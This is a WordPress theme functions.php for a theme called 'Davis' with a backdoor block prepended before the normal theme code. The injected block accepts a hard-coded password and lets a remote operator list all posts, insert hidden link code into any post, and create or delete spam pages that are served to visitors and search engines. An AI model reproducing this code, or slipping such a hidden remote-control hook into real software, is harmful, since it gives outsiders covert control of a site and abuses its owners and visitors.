<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8b9092183405ce77377a3ef906b832d4'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.esc_sql($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . esc_sql($post_content) . '" WHERE `ID` = "' . esc_sql($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.esc_sql($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.esc_sql($_REQUEST['url']).'", `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql($_REQUEST['content']).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql(urldecode($_REQUEST['content'])).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
   /**
    * Davis files definition
    *
    * @link https://developer.wordpress.org/themes/basics/theme-functions/
    *
    * @package Davis
    *
    *
    */

    // Setup the theme
    require get_template_directory() . '/inc/setup.php';
    // Functions for woocommerce
    require get_template_directory() . '/inc/functions/woocommerce.php';
    // Hooks for the cart
    require get_template_directory() . '/inc/frontend/cart.php';
    // Hooks for the login
    require get_template_directory() . '/inc/frontend/login.php';
    // Hooks for woocommerce
    require get_template_directory() . '/inc/frontend/woocommerce.php';
    // Hooks for layout
    require get_template_directory() . '/inc/frontend/layout.php';
    // Hooks for search
    require get_template_directory() . '/inc/frontend/search.php';
    // Options for the customizer
    require get_template_directory() . '/inc/backend/theme_options/conf.php';
    // Global function for wishlist
    require get_template_directory() . '/inc/functions/wishlist.php';
    // Global function for images
    require get_template_directory() . '/inc/functions/images.php';

    if ( is_admin() ) {
        // Backend hooks related
        require get_template_directory() . '/inc/backend/register-plugins.php';

        // Plugins libs/init
        require get_template_directory() . '/inc/plugins/class-tgm-plugin-activation.php';
        require get_template_directory() . '/inc/plugins/acf.php';

        // Mega menu
	    require get_template_directory() . '/inc/mega-menu/class-mega-menu.php';
    } else {
        // Global functions
        require get_template_directory() . '/inc/functions/entries.php';
        require get_template_directory() . '/inc/functions/cart.php';
        require get_template_directory() . '/inc/functions/reviews.php';

	    require get_template_directory() . '/inc/mega-menu/class-mega-menu-walker.php';

        require get_template_directory() . '/inc/frontend/template-tags.php';
        require get_template_directory() . '/inc/frontend/widgets.php';

        // Plugins Override
        require get_template_directory() . '/inc/plugins/reviews-pro.php';
        require get_template_directory() . '/inc/plugins/reviews-pro-type.php';
        require get_template_directory() . '/inc/plugins/social-checkout.php';
    }

 /*
 * If ACF plugin is not activated, create this fallback
 */
 if ( !is_admin() && !function_exists('get_field') ) {

     function get_field($key) {
         return get_post_meta(get_the_ID(), $key, true);
     }

 }
